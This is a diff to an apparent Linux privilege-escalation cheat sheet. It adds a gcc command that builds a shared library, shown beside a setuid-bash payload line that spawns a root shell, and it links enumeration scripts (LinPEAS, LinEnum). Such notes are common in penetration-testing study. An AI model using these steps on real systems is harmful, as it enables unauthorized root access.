@@ -728,6 +728,10 @@ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
 
+```bash
+gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
+```
+
 ### Use LinPEAS and LinEnum and Linprivchecker
 - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
